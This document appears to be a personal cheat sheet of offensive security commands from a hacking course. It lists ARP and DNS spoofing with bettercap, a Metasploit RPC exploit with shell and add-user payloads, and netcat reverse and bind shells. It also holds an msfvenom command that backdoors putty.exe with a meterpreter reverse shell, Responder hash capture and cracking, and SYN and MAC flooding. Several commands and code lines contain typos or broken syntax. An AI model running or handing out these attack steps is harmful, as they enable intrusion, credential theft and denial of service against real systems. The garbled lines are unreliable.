#ARP Spoofing 

libnetfilter-queve-dev libpcap-dev 

net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets (IP)
arp.spoof on
set net.sniff.local true
net.sniff on


#DNS Spoofing 

net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets (IP)
arp.spoof on
net.sniff on
set dns.spoof.all true
set dns.spoof.domains iacsd.com
dns.spoof on

#HTTP Tunnelling

ngrok download 

./ngrok config auth-token
./ngrok http 80


#RPC using MSFConsole

search ms03_026
use "location"
show options
set RHOST "IP"
show payloads 
set payloads windows/shell/bind_tcp
show options 
exploit
set payloads windows/adduser
exploit

#SNMP Enumeration

snmp perl-tk
cpan Term::ReadKey
install libnet-snmp-perl libnumber-bytes-human-perl
wget snmpcheck1.8.pl
chmod 755 snmp.script
./snmp -d -t "IP"

#OS Detection, OS Scan
sudo nmap -O "IP"

#Vulnerability Assessment

sudo nmap -sV "IP"

#Netcat

install netcat
linux * netcat -lvvp 4444

windows * nc -vv "IP" 4444



echo "Good Morning" > secret.txt
type secret.txt

linux * nc -lvp 4444 > output.txt

windows * nc -vv "IP" 4444 < secret.txt 

linux * cat output.txt

windows * nc -lvvp 4444 -e cmd.exe

linux * nc -vv "IP" 4444

windows * mc -lvvp 4444

linux * nc -v "IP" 4444 -e /bin/bash

#Putty Trojan 

msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost="listener's IP" lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyx.exe

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST "Listener's IP"

exploit


#Socket Programming

import socket 
tcpsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
tcpsocket.bind(("IP",8000))
tcpsocket.listen()
(clientsocket,(ip,port)) = tcpsocket.accept()
print(ip)
print(port)
clientsocket.send(b"\nPython Rocks"\n)
data = clientsocket.recv(2048)
print(data)
clientsocket.close()
tcpsocket.close()

#Flask

install python3 python3-pip python3-env

mkdir flask
cd flask

python3 -m venv

source bin/activate
pip3 install flask
python3 -c "import flask; print(flask.__version__)"

nano hello.py 

from flask import flask 
app = Flask(__name__)

@app.route('/')
def home():
	return "Hello, this is our First Flask Website";
if __name__ == '__main__':
	app.run(host='0.0.0.0',port=6001)
	
	
#Responder LLMNR/NBT-NS

#Kali 
apt-get install -y ca-certificates git hashcat ocl-icd-libopencl1 ocl-icd-opencl-dev python3 python3-netifaces 

git clone Responder

cd Responder

ls

./Responder.py -I ens33 -v

hashcat -m 5600 "logs.txt" "password.txt" --force

#Adb Shell 

apt-get install adb

adb devices

adb connect "IP"

adb shell

$id
$whoami
$ps
$ls

adb shell ls -l /mnt/sdcard

mkdir mob
cd mob
adb push text.txt /mnt/sdcard
adb shell cat /sdcard/text.txt

adb shell "pm list packages"

adb -s IP:5555 shell "cmd package list packages"

adn install "app.apk"

adb uninstall "app.apk"

adb shell screencap /sdcard/screencap.png

adb pull sdcard/screencap.png

adb cat /proc/version

adb shell cat /proc/cpuinfo

#Decompiling APK

wget -q "apk"

unzip -qq "apk" -d folder_extract

cd folder_extract

ls -l

apktool d "apk"

cd folder_extractnew

cat AndroidManifest.xml

mkdir newmob

cd newmob

git clone jadx

cd jadx

./gradlew dist

./build/jadx/bin/jadx --version

./jadx/build/jadx/bin/jadx "apk" -d jadx_extract

cat jadx_extract/sources

find jadx_extract/sources -name *.java

apktool b folder_extract -o "newapk"

apt-get install default-jdk/jre 

jarsigner -verify "apk"

jarsigner -verify "newapk"

mkdir keys

keytool -genkey -v keystore mykeys.keystore -alias MyKeys -keyalg RSA -keysize 2048 -validity 10000

keytool -list -keystore mykeys.keystore 

cd newmob

jarsigner --verbose -sigalg SHA256withRSA -dig estalg SHA1 -keystore keys/mykeys.keystore newmob/newapk MyKeys

ls -l folder_extract/MetaINF/*.RSA

keytool -printcert -file folder_extract/MetaINF/Release.RSA

#SYNFLOOD
#MSFConsole

search synflood

use auxiliary/dos/tcp/synflood

show options

set RHOSTS "Victim's IP"

exploit

#Mac Flooding

apt-get install macof 

sudo macof -i ens33

#DNS Enumeration

set type = ns

server checkpoint.com

ls -d "checkpoint.com"

#Banner Grabbing

telnet ip portno.
Head /HTTP/1.1

nmap -sV "IP"


